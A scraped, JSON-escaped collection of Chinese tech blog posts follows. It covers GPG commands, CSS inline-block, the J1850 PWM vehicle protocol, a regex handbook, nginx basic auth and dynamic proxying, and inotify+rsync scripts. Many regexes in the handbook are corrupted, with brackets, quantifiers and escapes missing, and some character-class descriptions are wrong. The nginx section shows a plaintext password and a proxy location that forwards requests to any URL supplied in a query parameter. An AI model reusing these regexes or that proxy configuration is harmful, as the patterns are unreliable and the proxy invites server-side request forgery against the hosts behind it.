details.\nsec  1024D/A3942296 2008-12-19 Hyphen Wang (Use for GPG Encrypt) gpgencrypt@linuxfly.org\n\n要从钥匙环里删除这把密钥吗？(y/N)y\n这是一把私钥！――真的要删除吗？(y/N)y\n\n必须先删除私钥，然后才能删除公钥。\n从公钥钥匙环里删除密钥：\n\ngpg --delete-keys hyphenwang@redflag-linux.com\ngpg (GnuPG) 1.4.5; Copyright (C) 2006 Free Software Foundation, Inc.\nThis program comes with ABSOLUTELY NO WARRANTY.\nThis is free software, and you are welcome to redistribute it\nunder certain conditions. See the file COPYING for details.\nsec  1024D/A3942296 2008-12-19 Hyphen Wang (Use for GPG Encrypt) gpgencrypt@linuxfly.org\n\n要从钥匙环里删除这把密钥吗？(y/N)y\n\n三.对称加密:\n当然GPG同样具备普通的对称加密功能，这时候就不需要密钥，直接用密码加密即可（注意，这里的密码不一定是你私钥的密码，您大可以随意设定）\n\ngpg -o doc.gpg -c doc\n\n－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－\n\n四.GPG常用参数:\n语法：gpg [选项] [文件名]\n签字、检查、加密或解密\n默认的操作依输入数据而定\n指令：\n\n-s, --sign [文件名]           生成一份签字\n--clearsign [文件名]      生成一份明文签字\n-b, --detach-sign             生成一份分离的签字\n-e, --encrypt                 加密数据\n-c, --symmetric               仅使用对称加密\n-d, --decrypt                 解密数据(默认)\n--verify                  验证签字\n--list-keys               列出密钥\n--list-sigs               列出密钥和签字\n--check-sigs              列出并检查密钥签字\n--fingerprint             列出密钥和指纹\n-K, --list-secret-keys        列出私钥\n--gen-key                 生成一副新的密钥对\n--delete-keys             从公钥钥匙环里删除密钥\n--delete-secret-keys      从私钥钥匙环里删除密钥\n--sign-key                为某把密钥添加签字\n--lsign-key               为某把密钥添加本地签字\n--edit-key                编辑某把密钥或为其添加签字\n--gen-revoke              生成一份吊销证书\n--export                  导出密钥\n--send-keys               把密钥导出到某个公钥服务器上\n--recv-keys               从公钥服务器上导入密钥\n--search-keys             在公钥服务器上搜寻密钥\n--refresh-keys            从公钥服务器更新所有的本地密钥\n--import                  导入/合并密钥\n--card-status             打印卡状态\n--card-edit               更改卡上的数据\n--change-pin              更改卡的 PIN\n--update-trustdb          更新信任度数据库\n--print-md 算法 [文件]    使用指定的散列算法打印报文散列值\n\n选项：\n\n-a, --armor                   输出 ASCII 文本文件\n-r, --recipient               为收件者“UID”加密\n-u, --local-user              使用这个用户标识来签字或解密\n-z N                          设定压缩等级为 N (0 表示不压缩)\n--textmode                    使用标准的文本模式\n-o, --output                  指定输出文件\n-v, --verbose                 详细模式\n-n, --dry-run                 不做任何改变\n-i, --interactive             覆盖前先询问\n--openpgp                 行为严格遵循 OpenPGP 定义\n--pgp2                    生成与 PGP 2.x 兼容的报文\n\n(请参考在线说明以获得所有命令和选项的完整清单)\n\n范例：\n\n-se -r Bob [文件名]          为 Bob 这个收件人签字及加密\n--clearsign [文件名]         做出明文签字\n--detach-sign [文件名]       做出分离式签字\n--list-keys [某甲]           显示密钥\n--fingerprint [某甲]         显示指纹","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-20-the-sixth-day-talk-about-inline-block","title":"第六天，谈谈【inline-block】","text":"---\n\n对一个html元素应用display:inline-block会产生怎样的效果？\n\n官方文档是这样说的：\n\n  inline-block\n    This value causes an element to generate an inline-level\n  block container. The inside of an inline-block is formatted as a block\n  box, and the element itself is formatted as an atomic inline-level\n  box.\n\n也就是说：inline-block会使元素成为一个行级块容器。即在容器内部产生BFC，而容器本身则被格式化为一个行级元素（内联元素）。\n\n更通俗的说就是：inline-block元素可以像块元素那样设置宽高等属性，同时还会像内联元素一样水平排列、可以设置vertical-align、收缩包围自身内容。\n\n先来看看在现代浏览器中分别对块元素和内联元素应用display:inline-block后的效果。应用之前如下：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/V2LMF/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n接着我们给块元素和内联元素应用display:inline-block，效果如下：\niframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/V2LMF/1/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n请比较上面的两组代码，和显示效果。\n\n那么IE浏览器是否支持inline-block呢？答案是肯定的，从MSDN的文档上.aspx)我们可以看到：\n\n  The inline-block value is supported starting with Internet Explorer\n  5.5.\n\n也就是说IE 从5.5版本就开始支持inline-block了。但是在IE 6、7中对元素应用display:inline-block产生的效果和现代浏览器并不完全一致。\n\n接下来我们分别讨论在IE 6、7中对内联元素和 块元素 应用display:inline-block，看看会产生怎样的效果。\n\n 给内联元素应用display:inline-block\n\n 测试用例一如下：\n\n        Lorem ipsum dolor sit amet, consectetur\n        span style=\"background: yellow;border: 2px solid blue;\"Lorem ipsum br dolor sit amet. /span\n        adipisicing elit. Consequuntur a.\n\n 给span应用display:inline-block前后的效果对比如下：\n\n   应用前 | 应用后","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 PWM协议解析","title":"PWM协议解析","text":"SAEJ1850 PWM协议也是OBD II标准中的一种，通常应用在FORD车系汽车中，已知的还有JAGUAR，MAZDA。PWM英文全称是Pulse Width Modulation，即脉宽调制。下面从物理层特性、帧结构、命令交互、交互时间参数、常用命令字等几个方面来介绍这种协议。\n\nØ  物理层特性：波特率为41.7kbps；线路物理特性：双线，双向，半双工（差分信号）。通信电平通常为12V。数据位描述，位1见图2-3-1，位0见图2-3-2：\n\n图2-3-1\n\n图2-3-2\n\n时间参数定义如下：\nTP1：常规为8us，取值范围，在发送命令中7\u003c=TP1\u003c=9，在接收命令时，6\u003c=TP1\u003c=11\nTP2：常规为16us，取值范围，在发送命令中15\u003c=TP1\u003c=17，在接收命令时，14\u003c=TP1\u003c=19\nTP3(一个位的时间长度)：常规为24us，取值范围，在发送命令中23\u003c=TP1\u003c=25.5，在接收命令时，22\u003c=TP1\u003c=27\n图2-3-3是MAZDA原厂设备IDS系统进入命令的一部分波形\n\n图2-3-3\n\nØ  帧结构：命令头（3个字节）+ 数据区 + CRC校验。一帧命令最长为12个字节。\n在命令头中，包括以下几个部分的内容：格式字节(C4H)+目标地址+源地址。\n请参见图2-3-4和图2-3-5\n\n                                                 图2-3-4\n\n                                                        图2-3-5\nTP4：SOF（帧起始标志）时间，常规为48us，取值范围，发送时47\u003c=TP4\u003c=51,接收时46\u003c=TP4\u003c=63\nTP5：EOF（帧结束标志）时间，常规为72us，取值范围，发送时70\u003c=TP5\u003c=76.5，接收时TP5》=70\n命令体的内容中：命令字+命令内容。命令内容可以没有。\n举例如下：\nC4H  10H  F5H  13H  C7H\n第一个字节C4H为格式\n第二个字节10H为目标地址\n第三个字节F5H为源地址\n第四个字节（PID，功能号）13H为命令字，表示系统读码\n最后一个字节04H为前面4个字节的校验和\n\nØ  命令交互：命令交互通常情况下为1对1，但也存在1对多的情况。下面是一组命令交互举例：\nTools: C4H  10H  F5H  22H  11H  00H  3BH\nEcu:   C4H  F5H  10H  62H  11H  00H  09H  FFH  00H  00H  6AH\n在交互中，因为发送命令的对象不一样，所以目标地址和源地址是进行了互换；同时，ECU响应设备的命令字在设备命令字的基础上+0x40\n注：无链路保持。\nØ  常用命令字：\n读故障码：13H\n清除故障码：14H\n读数据流：22H\n读版本信息：1AH","tags":null},{"location":"//blog.pytool.com/basic/2015-01-01 常用正则表达式","title":"正则表达式前端使用手册","text":"PS：正则表达式用于字符串处理、表单验证等场合，实用高效。以下表达式本人收集于网络，做了简单整理，以备不时之需。没有全部验证，可能会存在部分错误，读者请自己调试鉴别更正。\n\n匹配中文字符的正则表达式： [\\u4e00-\\u9fa5]\n评注：匹配中文还真是个头疼的事，有了这个表达式就好办了\n\n匹配双字节字符(包括汉字在内)：\n评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）\n\n匹配空白行的正则表达式：\\n\\s\\r\n评注：可以用来删除空白行\n\n匹配HTML标记的正则表达式：(\\S?)[^]  .?/\\1|.? /\n评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力\n\n匹配首尾空白字符的正则表达式：^\\s|\\s$\n评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式\n\n匹配Email地址的正则表达式：\\w+([-+.]\\w+)@\\w+([-.]\\w+)\\.\\w+([-.]\\w+)\n评注：表单验证时很实用\n\n匹配网址URL的正则表达式：[a-zA-z]+://\n评注：网上流传的版本功能很有限，上面这个基本可以满足需求\n\n匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^a-zA-Z{4,15}$\n评注：表单验证时很实用\n\n匹配国内电话号码：\\d{3}-\\d{8}|\\d{4}-\\d{7}\n评注：匹配形式如 0511-4405222 或 021-87888822\n\n匹配腾讯QQ号：1-9{4,}\n评注：腾讯QQ号从10000开始\n\n匹配中国邮政编码：[1-9]\\d{5}(?!\\d)\n评注：中国邮政编码为6位数字\n\n匹配身份证：\\d{15}|\\d{18}\n评注：中国的身份证为15位或18位\n\n匹配ip地址：\\d+\\.\\d+\\.\\d+\\.\\d+\n评注：提取ip地址时有用\n\n匹配特定数字：\n^[1-9]\\d$　 　 //匹配正整数\n^-[1-9]\\d$ 　 //匹配负整数\n^-?[1-9]\\d$　　 //匹配整数\n^[1-9]\\d|0$　 //匹配非负整数（正整数 + 0）\n^-[1-9]\\d|0$　　 //匹配非正整数（负整数 + 0）\n^[1-9]\\d\\.\\d|0\\.\\d[1-9]\\d$　　 //匹配正浮点数\n^-([1-9]\\d\\.\\d|0\\.\\d[1-9]\\d)$　 //匹配负浮点数\n^-?([1-9]\\d\\.\\d|0\\.\\d[1-9]\\d|0?\\.0+|0)$　 //匹配浮点数\n^[1-9]\\d\\.\\d|0\\.\\d[1-9]\\d|0?\\.0+|0$　　 //匹配非负浮点数（正浮点数 + 0）\n^(-([1-9]\\d\\.\\d|0\\.\\d[1-9]\\d))|0?\\.0+|0$　　//匹配非正浮点数（负浮点数 + 0）\n评注：处理大量数据时有用，具体应用时注意修正\n\n匹配特定字符串：\n^[A-Za-z]+$　　//匹配由26个英文字母组成的字符串\n^[A-Z]+$　　//匹配由26个英文字母的大写组成的字符串\n^[a-z]+$　　//匹配由26个英文字母的小写组成的字符串\n^[A-Za-z0-9]+$　　//匹配由数字和26个英文字母组成的字符串\n^\\w+$　　//匹配由数字、26个英文字母或者下划线组成的字符串\n\n评注：上面是最基本也是最常用的一些表达式\n\n在使用RegularExpressionValidator验证控件时的验证功能及其验证表达式介绍如下:\n\n只能输入数字：“^[0-9]$”\n只能输入n位的数字：“^d{n}$”\n只能输入至少n位数字：“^d{n,}$”\n只能输入m-n位的数字：“^d{m,n}$”\n只能输入零和非零开头的数字：“^(0|1-9)$”\n只能输入有两位小数的正实数：“^[0-9]+(.[0-9]{2})?$”\n只能输入有1-3位小数的正实数：“^[0-9]+(.[0-9]{1,3})?$”\n只能输入非零的正整数：“^+?1-9$”\n只能输入非零的负整数：“^-1-9$”\n只能输入长度为3的字符：“^.{3}$”\n只能输入由26个英文字母组成的字符串：“^[A-Za-z]+$”\n只能输入由26个大写英文字母组成的字符串：“^[A-Z]+$”\n只能输入由26个小写英文字母组成的字符串：“^[a-z]+$”\n只能输入由数字和26个英文字母组成的字符串：“^[A-Za-z0-9]+$”\n只能输入由数字、26个英文字母或者下划线组成的字符串：“^w+$”\n验证用户密码:“^[a-zA-Z]w{5,17}$”正确格式为：以字母开头，长度在6-18之间，\n\n只能包含字符、数字和下划线。\n验证是否含有^%\u0026’,;=?$”等字符：“+”\n只能输入汉字：“^[u4e00-u9fa5],{0,}$”\n验证Email地址：“^w+[-+.]w+)@w+([-.]w+).w+([-.]w+)$”\n验证InternetURL：“^http://([w-]+.)+[w-]+(/[w-./?%\u0026=])?$”\n验证电话号码：“^((d{3,4})|d{3,4}-)?d{7,8}$”\n\n正确格式为：“XXXX-XXXXXXX”，“XXXX-XXXXXXXX”，“XXX-XXXXXXX”，\n\n“XXX-XXXXXXXX”，“XXXXXXX”，“XXXXXXXX”。\n验证身份证号（15位或18位数字）：“^d{15}|d{}18$”\n验证一年的12个月：“^(0?[1-9]|1[0-2])$”正确格式为：“01”-“09”和“1”“12”\n验证一个月的31天：“^((0?[1-9])|((1|2)[0-9])|30|31)$”\n\n正确格式为：“01”“09”和“1”“31”。\n表达式全集\n\n正则表达式有多种不同的风格。下表是在PCRE中元字符及其在正则表达式上下文中的行为的一个完整列表：\n字符 \t描述\n\\ \t将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。例如，“n”匹配字符“n”。“\\n”匹配一个换行符。序列“\\\\”匹配“\\”而“\\(”则匹配“(”。\n^ \t匹配输入字符串的开始位置。如果设置了RegExp对象的Multiline属性，^也匹配“\\n”或“\\r”之后的位置。\n$ \t匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“\\n”或“\\r”之前的位置。\n匹配前面的子表达式零次或多次。例如，zo能匹配“z”以及“zoo”。等价于{0,}。\n匹配前面的子表达式一次或多次。例如，“zo+”能匹配“zo”以及“zoo”，但不能匹配“z”。+等价于{1,}。\n? \t匹配前面的子表达式零次或一次。例如，“do(es)?”可以匹配“do”或“does”中的“do”。?等价于{0,1}。\n{n} \tn是一个非负整数。匹配确定的n次。例如，“o{2}”不能匹配“Bob”中的“o”，但是能匹配“food”中的两个o。\n{n,} \tn是一个非负整数。至少匹配n次。例如，“o{2,}”不能匹配“Bob”中的“o”，但能匹配“foooood”中的所有o。“o{1,}”等价于“o+”。“o{0,}”则等价于“o”。\n{n,m} \tm和n均为非负整数，其中n\u003c=m。最少匹配n次且最多匹配m次。例如，“o{1,3}”将匹配“fooooood”中的前三个o。“o{0,1}”等价于“o?”。请注意在逗号和两个数之间不能有空格。\n? \t当该字符紧跟在任何一个其他限制符（,+,?，{n}，{n,}，{n,m}）后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串“oooo”，“o+?”将匹配单个“o”，而“o+”将匹配所有“o”。\n. \t匹配除“\\n”之外的任何单个字符。要匹配包括“\\n”在内的任何字符，请使用像“[.\\n]”的模式。\n(pattern) \t匹配pattern并获取这一匹配。所获取的匹配可以从产生的Matches集合得到，在VBScript中使用SubMatches集合，在JScript中则使用$0…$9属性。要匹配圆括号字符，请使用“\\(”或“\\)”。\n(?:pattern) \t匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符“(|)”来组合一个模式的各个部分是很有用。例如“industr(?:y|ies)”就是一个比“industry|industries”更简略的表达式。\n(?=pattern) \t正向预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“Windows(?=95|98|NT|2000)”能匹配“Windows2000”中的“Windows”，但不能匹配“Windows3.1”中的“Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。\n(?!pattern) \t负向预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如“Windows(?!95|98|NT|2000)”能匹配“Windows3.1”中的“Windows”，但不能匹配“Windows2000”中的“Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始\nx|y \t匹配x或y。例如，“z|food”能匹配“z”或“food”。“(z|f)ood”则匹配“zood”或“food”。\n[xyz] \t字符集合。匹配所包含的任意一个字符。例如，“[abc]”可以匹配“plain”中的“a”。\n \t负值字符集合。匹配未包含的任意字符。例如，“”可以匹配“plain”中的“p”。\n[a-z] \t字符范围。匹配指定范围内的任意字符。例如，“[a-z]”可以匹配“a”到“z”范围内的任意小写字母字符。\n \t负值字符范围。匹配任何不在指定范围内的任意字符。例如，“”可以匹配任何不在“a”到“z”范围内的任意字符。\n\\b \t匹配一个单词边界，也就是指单词和空格间的位置。例如，“er\\b”可以匹配“never”中的“er”，但不能匹配“verb”中的“er”。\n\\B \t匹配非单词边界。“er\\B”能匹配“verb”中的“er”，但不能匹配“never”中的“er”。\n\\cx \t匹配由x指明的控制字符。例如，\\cM匹配一个Control-M或回车符。x的值必须为A-Z或a-z之一。否则，将c视为一个原义的“c”字符。\n\\d \t匹配一个数字字符。等价于[0-9]。\n\\D \t匹配一个非数字字符。等价于。\n\\f \t匹配一个换页符。等价于\\x0c和\\cL。\n\\n \t匹配一个换行符。等价于\\x0a和\\cJ。\n\\r \t匹配一个回车符。等价于\\x0d和\\cM。\n\\s \t匹配任何空白字符，包括空格、制表符、换页符等等。等价于[\\f\\n\\r\\t\\v]。\n\\S \t匹配任何非空白字符。等价于。\n\\t \t匹配一个制表符。等价于\\x09和\\cI。\n\\v \t匹配一个垂直制表符。等价于\\x0b和\\cK。\n\\w \t匹配包括下划线的任何单词字符。等价于“[A-Za-z0-9]”。\n\\W \t匹配任何非单词字符。等价于“”。\n\\xn \t匹配n，其中n为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，“\\x41”匹配“A”。“\\x041”则等价于“\\x04\u00261”。正则表达式中可以使用ASCII编码。.\n\\num \t匹配num，其中num是一个正整数。对所获取的匹配的引用。例如，“(.)\\1”匹配两个连续的相同字符。\n\\n \t标识一个八进制转义值或一个向后引用。如果\\n之前至少n个获取的子表达式，则n为向后引用。否则，如果n为八进制数字（0-7），则n为一个八进制转义值。\n\\nm \t标识一个八进制转义值或一个向后引用。如果\\nm之前至少有nm个获得子表达式，则nm为向后引用。如果\\nm之前至少有n个获取，则n为一个后跟文字m的向后引用。如果前面的条件都不满足，若n和m均为八进制数字（0-7），则\\nm将匹配八进制转义值nm。\n\\nml \t如果n为八进制数字（0-3），且m和l均为八进制数字（0-7），则匹配八进制转义值nml。\n\\un \t匹配n，其中n是一个用四个十六进制数字表示的Unicode字符。例如，\\u00A9匹配版权符号（?）。\n以下是以PHP的语法所写的示例\n\n验证字符串是否只含数字与英文，字符串长度并在4~16个字符之间\n\n\u003c?php\n$str = 'a1234';\nif (pregmatch(\"^[a-zA-Z0-9]{4,16}$\", $str)) {\n    echo \"驗證成功\";\n} else {\n    echo \"驗證失敗\";\n}\n?  简易的台湾身份证字号验证\n\n\u003c?php\n$str = 'a1234';\nif (pregmatch(\"/^\\w[12]\\d{8}$/\", $str)) {\n    echo \"驗證成功\";\n} else {\n    echo \"驗證失敗\";\n}\n?  以下示例是用 Perl 语言写的，与上面的示例功能相同\n\nprint $str = \"a1234\" =~ m:^[a-zA-Z0-9]{4,16}$: ? \"COMFIRM\" : \"FAILED\";\n\nprint $str = \"a1234\" =~ m\"^\\w[12]\\d{8}$\" ? \"COMFIRM\" : \"INVAILD\";\n\n如何写出高效率的正则表达式\n\n如果纯粹是为了挑战自己的正则水平，用来实现一些特效（例如使用正则表达式计算质数、解线性方程），效率不是问题；如果所写的正则表达式只是为了满足一两次、几十次的运行，优化与否区别也不太大。但是，如果所写的正则表达式会百万次、千万次地运行，效率就是很大的问题了。我这里总结了几条提升正则表达式运行效率的经验（工作中学到的，看书学来的，自己的体会），贴在这里。如果您有其它的经验而这里没有提及，欢迎赐教。\n\n为行文方便，先定义两个概念。\n\n误匹配：指正则表达式所匹配的内容范围超出了所需要范围，有些文本明明不符合要求，但是被所写的正则式“击中了”。例如，如果使用\\d{11}来匹配11位的手机号，\\d{11}不单能匹配正确的手机号，它还会匹配98765432100这样的明显不是手机号的字符串。我们把这样的匹配称之为误匹配。\n\n漏匹配：指正则表达式所匹配的内容所规定的范围太狭窄，有些文本确实是所需要的，但是所写的正则没有将这种情况囊括在内。例如，使用\\d{18}来匹配18位的身份证号码，就会漏掉结尾是字母X的情况。\n\n写出一条正则表达式，既可能只出现误匹配（条件写得极宽松，其范围大于目标文本），也可能只出现漏匹配（只描述了目标文本中多种情况种的一种），还可能既有误匹配又有漏匹配。例如，使用\\w+\\.com来匹配.com结尾的域名，既会误匹配abc.com这样的字串（合法的域名中不含下划线，\\w包含了下划线这种情况），又会漏掉ab-c.com这样的域名（合法域名中可以含中划线，但是\\w不匹配中划线）。\n\n精准的正则表达式意味着既无误匹配且无漏匹配。当然，现实中存在这样的情况：只能看到有限数量的文本，根据这些文本写规则，但是这些规则将会用到海量的文本中。这种情况下，尽可能地（如果不是完全地）消除误匹配以及漏匹配，并提升运行效率，就是我们的目标。本文所提出的经验，主要是针对这种情况。\n\n掌握语法细节。正则表达式在各种语言中，其语法大致相同，细节各有千秋。明确所使用语言的正则的语法的细节，是写出正确、高效正则表达式的基础。例如，perl中与\\w等效的匹配范围是[a-zA-Z0-9_]；perl正则式不支持肯定逆序环视中使用可变的重复（variable repetition inside lookbehind，例如(?\u003c=.)abc），但是.Net语法是支持这一特性的；又如，JavaScript连逆序环视（Lookbehind,如(?\u003c=ab)c）都不支持，而perl和python是支持的。《精通正则表达式》第3章《正则表达式的特性和流派概览》明确地列出了各大派系正则的异同，这篇文章也简要地列出了几种常用语言、工具中正则的比较。对于具体使用者而言，至少应该详细了解正在使用的那种工作语言里正则的语法细节。\n\n先粗后精，先加后减。使用正则表达式语法对于目标文本进行描述和界定，可以像画素描一样，先大致勾勒出框架，再逐步在局步实现细节。仍举刚才的手机号的例子，先界定\\d{11}，总不会错；再细化为1[358]\\d{9}，就向前迈了一大步（至于第二位是不是3、5、8，这里无意深究，只举这样一个例子，说明逐步细化的过程）。这样做的目的是先消除漏匹配（刚开始先尽可能多地匹配，做加法），然后再一点一点地消除误匹配（做减法）。这样有先有后，在考虑时才不易出错，从而向“不误不漏”这个目标迈进。\n\n留有余地。所能看到的文本sample是有限的，而待匹配检验的文本是海量的，暂时不可见的。对于这样的情况，在写正则表达式时要跳出所能见到的文本的圈子，开拓思路，作出“战略性前瞻”。例如，经常收到这样的垃圾短信：“发票”、“发#漂”。如果要写规则屏蔽这样烦人的垃圾短信，不但要能写出可以匹配当前文本的正则表达式 发#，还要能够想到 发.(?:票|漂|飘)之类可能出现的“变种”。这在具体的领域或许会有针对性的规则，不多言。这样做的目的是消除漏匹配，延长正则表达式的生命周期。\n\n明确。具体说来，就是谨慎用点号这样的元字符，尽可能不用星号和加号这样的任意量词。只要能确定范围的，例如\\w，就不要用点号；只要能够预测重复次数的，就不要用任意量词。例如，写析取twitter消息的脚本，假设一条消息的xml正文部分结构是span class=”msg”…/span且正文中无尖括号，那么span class=”msg”，它保证了文本的范围不会超出下一个小于号所在的位置；二是明确长度范围，{1,480}，其依据是一条twitter消息大致能的字符长度范围。当然，480这个长度是否正确还可推敲，但是这种思路是值得借鉴的。说得狠一点，“滥用点号、星号和加号是不环保、不负责任的做法”。\n\n不要让稻草压死骆驼。每使用一个普通括号()而不是非捕获型括号(?:…)，就会保留一部分内存等着你再次访问。这样的正则表达式、无限次地运行次数，无异于一根根稻草的堆加，终于能将骆驼压死。养成合理使用(?:…)括号的习惯。\n\n宁简勿繁。将一条复杂的正则表达式拆分为两条或多条简单的正则表达式，编程难度会降低，运行效率会提升。例如用来消除行首和行尾空白字符的正则表达式s/^\\s+|\\s+$//g;，其运行效率理论上要低于s/^\\s+//g; s/\\s+$//g; 。这个例子出自《精通正则表达式》第五章，书中对它的评论是“它几乎总是最快的，而且显然最容易理解”。既快又容易理解，何乐而不为？工作中我们还有其它的理由要将C==(A|B)这样的正则表达式拆为A和B两条表达式分别执行。例如，虽然A和B这两种情况只要有一种能够击中所需要的文本模式就会成功匹配，但是如果只要有一条子表达式（例如A）会产生误匹配，那么不论其它的子表达式（例如B）效率如何之高，范围如何精准，C的总体精准度也会因A而受到影响。\n\n巧妙定位。有时候，我们需要匹配的the，是作为单词的the（两边有空格），而不是作为单词一部分的t-h-e的有序排列（例如together中的the）。在适当的时候用上^，$，\\b等等定位锚点，能有效提升找到成功匹配、淘汰不成功匹配的效率。","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx basicauth","title":"Linux命令 Nginx basicauth","text":"chmod 400 htpasswd\n\nprintf \"liuyc:$(openssl passwd -crypt Liuyc@2017)\\n\"     htpasswd\n cat conf/htpasswd\nttlsa:xyJkVhXGAZ8tM\n\n  location /\n  {\n          authbasic \"nginx basic http test for ttlsa.com\";\n          authbasicuserfile conf/htpasswd;\n          autoindex on;\n  }\n\n  /usr/local/apache2/bin/htpasswd -c -d passfile username\n  #回车输入密码，-c 表示生成文件，-d 是以 crypt 加密。\n\nproxy \nlocation /proxy/ {\n  if ($argtoken ~ \"^$\") { return 404; }\n  if ($argurl ~ \"^$\") { return 404; }\n\n  set $url $argurl;\n  set $token $argtoken;\n  set $args \"\";\n\n   IMPORTANT, this is required when using dynamic proxy pass\n  # You can alternatively use any DNS resolver under your control\n  resolver 8.8.8.8;\n\n  proxypass $url;\n  proxysetheader Authorization \"Bearer $token\";\n  proxyredirect off;\n}\n`","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 inotify","title":"Linux命令 Inotifywatch","text":"---\ninotify+rsync实时同步\n\ninotifywait -mrq --timefmt '%d/%m/%y/%H:%M' --format '%T %w %f' -e modify,delete,create,attrib\n\ninotifywait命令参数\n -m是要持续监视变化。\n -r使用递归形式监视目录。\n -q减少冗余信息，只打印出需要的信息。\n -e指定要监视的事件列表。\n --timefmt是指定时间的输出格式。\n --format指定文件变化的详细信息。\n\n可监听的事件 事件 描述\naccess 访问，读取文件。\nmodify 修改，文件内容被修改。\nattrib 属性，文件元数据被修改。\nmove 移动，对文件进行移动操作。\ncreate 创建，生成新文件\nopen 打开，对文件进行打开操作。\nclose 关闭，对文件进行关闭操作。\ndelete 删除，文件被删除。\n\n来自: http://man.linuxde.net/inotifywait\n\ninotifywait 单独分析\n\n/usr/local/bin/inotifywait -mrq --format '%Xe %w%f' -e modify,create,delete,attrib /data/\n\n执行上面命令，是让inotifywait监听/data/目录，当监听到有发生modify,create,delete,attrib等事件发生时，按%Xe %w%f的格式输出。\n\n在/data/目录touch几个文件\ntouch /data/{1..5}\n\n观看inotify输出\nATTRIB /data/1           -- 表示发生了ATTRIB事件 路径为/data/1\nATTRIB /data/2\nATTRIB /data/3\nATTRIB /data/4\nATTRIB /data/5\n\n知道上面的输出效果之后 我们应该想得到，可以用rsync获取inotifywait监控到的文件列表来做指定的文件同步，而不是每次都由rsync做全目录扫描来判断文件是否存在差异。\n网上的inotify+rsync分析\n\n我们来看网上的教程，我加了注释。(网上所有的教程基本都一模一样，尽管写法不一样，致命点都是一样的)\n!/bin/bash\n/usr/bin/inotifywait -mrq --format '%w%f'-e create,closewrite,delete /backup |while read file\n把发生更改的文件列表都接收到file 然后循环，但有什么鬼用呢？下面的命令都没有引用这个$file 下面做的是全量rsync\ndo\n    cd /backup \u0026\u0026 rsync -az --delete /backup/ rsyncbackup@192.168.24.101::backup/--password-file=/etc/rsync.password\ndone\n\n注意看 这里的rsync 每次都是全量的同步(这就坑爹了)，而且 file列表是循环形式触发rsync ，等于有10个文件发生更改，就触发10次rsync全量同步(简直就是噩梦)，那还不如直接写个死循环的rsync全量同步得了。\n\n有很多人会说 日志输出那里明明只有差异文件的同步记录。其实这是rsync的功能，他本来就只会输出有差异需要同步的文件信息。不信你直接拿这句rsync来跑试试。\n\n这种在需要同步的源目录文件量很大的情况下，简直是不堪重负。不仅耗CPU还耗时，根本不可以做到实时同步。\n\n备注：backup为rsync server配置module，除了编写脚本以外，还需要配置一个rsync server，rsync server配置参考《http://www.ttlsa.com/linux/rsync-install-on-linux/》\n改良方法\n\n要做到实时，就必须要减少rsync对目录的递归扫描判断，尽可能的做到只同步inotify监控到已发生更改的文件。结合rsync的特性，所以这里要分开判断来实现一个目录的增删改查对应的操作。\n\n脚本如下\n!/bin/bash\nsrc=/data/                           # 需要同步的源路径\ndes=data                             # 目标服务器上 rsync --daemon 发布的名称，rsync --daemon这里就不做介绍了，网上搜一下，比较简单。\nrsyncpasswdfile=/etc/rsyncd.passwd            # rsync验证的密码文件\nip1=192.168.0.18                 # 目标服务器1\nip2=192.168.0.19                 # 目标服务器2\nuser=root                            # rsync --daemon定义的验证用户名\ncd ${src}                              # 此方法中，由于rsync同步的特性，这里必须要先cd到源目录，inotify再监听 ./ 才能rsync同步后目录结构一致，有兴趣的同学可以进行各种尝试观看其效果\n/usr/local/bin/inotifywait -mrq --format  '%Xe %w%f' -e modify,create,delete,attrib,closewrite,move ./ | while read file         # 把监控到有发生更改的\"文件路径列表\"循环\ndo\n        INOEVENT=$(echo $file | awk '{print $1}')      # 把inotify输出切割 把事件类型部分赋值给INOEVENT\n        INOFILE=$(echo $file | awk '{print $2}')       # 把inotify输出切割 把文件路径部分赋值给INO_FILE\n        echo \"","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx","title":"Linux命令 Nginx","text":"---\nNginx怎样部署SSL证书\nnginx运维与架构\nnginx服务器安装及配置文件详解\nNginx 配置文件详解\nNginx RTMP 模块 nginx-rtmp-module 指令详解\n使用Nginx+FFMPEG搭建HLS直播转码服务器\nnginx搭建支持http和rtmp协议的流媒体服务器\nRTMP流媒体播放过程\nm3u8-segmenter\nNginx安装\nroot与alias的区别\nnginx配置location总结及rewrite规则写法\nnginx应用总结（1）--基础认识和应用配置 - 散尽浮华 - 博客园\nnginx服务器安装及配置文件详解 - Sean's Notes - SegmentFault\nNginx.org 文档 - 文集 - 简书\n翻译 nginx 的 server names \n\nWeb服务器Nginx多方位优化策略 - 运维生存时间\n\n HSTS\naddheader Strict-Transport-Security max-age=2592000;\n\nnginx 仅通过检查请求首部中的 “HOST” 